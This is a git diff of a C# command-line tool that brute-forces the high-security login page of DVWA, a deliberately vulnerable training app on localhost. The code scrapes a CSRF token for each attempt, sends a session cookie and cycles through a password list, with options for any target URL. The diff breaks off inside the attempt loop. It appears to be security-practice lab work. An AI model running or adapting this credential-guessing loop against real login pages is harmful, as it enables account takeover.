@@ -1,5 +1,7 @@
 ﻿using AngleSharp;
 using AngleSharp.Dom;
+using System.CommandLine;
+using System.IO;
 
 namespace DVWA_BruteForce_HighSecurity
 {
@@ -7,23 +9,98 @@ namespace DVWA_BruteForce_HighSecurity
     {
         static async Task Main(string[] args)
         {
-            // TODO: create command line tack statements, allow for generic user input, allow for specific username attempt, cookie input with example, built in / default password list, accept txt or csv or manual password list, help option, verbose option. upload as a nuget pacakge with disclaimer. write blog post. 
+            // default running: dotnet run --
+            // dotnet run -- --username test
+            // dotnet run -- --url testurl
+            // dotnet run -- --url http://localhost:3000/vulnerabilities/brute/ --username test
+            // dotnet run -- --url "http://localhost:3000/vulnerabilities/brute/" --username test
+            // dotnet run -- --passwordList "C:\Users\chris\Downloads\PasswordListNewPath.txt"
+            // dotnet run -- --phpSessId nmal50l9m8re9sgnreen7a74e6 --username admin
+
+            // TODO: upload as a nuget pacakge with disclaimer. write blog post. 
+
+            var usernameOption = new Option<string>(
+                name: "--username",
+                description: "The username to use for the login attempts.",
+                getDefaultValue: () => "admin");
+
+            var baseUriOption = new Option<string>(
+                name: "--url",
+                description: "The URL of the login page.",
+                getDefaultValue: () => "http://localhost:3000/vulnerabilities/brute/");
+
+            // TODO: delete
+            var phpSessIdOption = new Option<string>(
+                name: "--phpSessId",
+                description: "The PHP Session Id to include with the request headers.",
+                getDefaultValue: () => "nmal50l9m8re9sgnreen7a74e6") // TODO: delete default value
+            { IsRequired = true };
+
+            // TODO: uncomment
+            //var phpSessIdOption = new Option<string>(
+            //    name: "--phpSessId",
+            //    description: "The PHP Session Id to include with the request headers. " +
+            //    "This can be found by using browser DevTools and inspecting the cookies after logging in to DVWA.")
+            //{ IsRequired = true };
+
+            var passwordListOption = new Option<string>(
+                name: "--passwordList",
+                description: "The absolute path to a password list file (TXT or CSV). If no file is specified, a default password list is used."); 
+
+            var rootCommand = new RootCommand("C# script for brute forcing the DVWA high-security login page.");
+            rootCommand.AddOption(usernameOption);
+            rootCommand.AddOption(baseUriOption);
+            rootCommand.AddOption(phpSessIdOption);
+            rootCommand.AddOption(passwordListOption);
+
+            rootCommand.SetHandler(async (usernameValue, baseUriValue, phpSessIdValue, passwordListPathValue) =>
+            {
+                await BruteForceLogin(usernameValue, baseUriValue, phpSessIdValue, passwordListPathValue);
+            },
+            usernameOption,
+            baseUriOption,
+            phpSessIdOption,
+            passwordListOption);
+
+            await rootCommand.InvokeAsync(args);
+        }
+
+        static async Task BruteForceLogin(string _username, string _targetBaseAddressURI, string _phpSessId, string _passwordListPath)
+        {
+            Console.WriteLine(_username);
+            Console.WriteLine(_targetBaseAddressURI);
+            Console.WriteLine(_phpSessId);
+            Console.WriteLine(_passwordListPath);
 
             // Initialize AngleSharp settings
             IConfiguration config = Configuration.Default;
             IBrowsingContext context = BrowsingContext.New(config);
 
-            var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
-            //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.csv").ToList();
+            List<string> passwordList = new();
 
-            var cookieContents = "PHPSESSID=nmal50l9m8re9sgnreen7a74e6; security=high";
-            var targetBaseAddressURI = "http://localhost:3000/vulnerabilities/brute/";
-            var csrfTokenName = "user_token";
-            var _username = "admin";
+            if(_passwordListPath != null && _passwordListPath != "")
+            {
+                passwordList = File.ReadLines(_passwordListPath).ToList();
+            }
+            else
+            {
+                //Console.WriteLine("Default pass list used");
+                passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
+                //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
+                //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.csv").ToList();
+            }
+
+            //var cookieContents = "PHPSESSID=nmal50l9m8re9sgnreen7a74e6; security=high";
+            var cookieContents = $"PHPSESSID={_phpSessId}; security=high";
+            // Console.WriteLine(cookieContents);
+
+            //var _targetBaseAddressURI = "http://localhost:3000/vulnerabilities/brute/";
+            //var csrfTokenName = "user_token";
+            //var _username = "admin";
 
             using (var httpClient = new HttpClient())
             {
-                httpClient.BaseAddress = new Uri(targetBaseAddressURI);
+                httpClient.BaseAddress = new Uri(_targetBaseAddressURI);
                 httpClient.DefaultRequestHeaders.Add("Cookie", cookieContents);
 
                 foreach (var _password in passwordList)
@@ -31,7 +108,7 @@ namespace DVWA_BruteForce_HighSecurity
                     // Make a GET request to the login page and parse for the CSRF token
                     var loginPageResponseBody = await httpClient.GetStringAsync("");
                     var document = await context.OpenAsync(req => req.Content(loginPageResponseBody));
-                    var csrfToken = document.QuerySelector($"input[name='{csrfTokenName}']").GetAttribute("value");
+                    var csrfToken = document.QuerySelector($"input[name='user_token']").GetAttribute("value");
 
                     if (csrfToken == null || csrfToken.Length == 0)
                     {
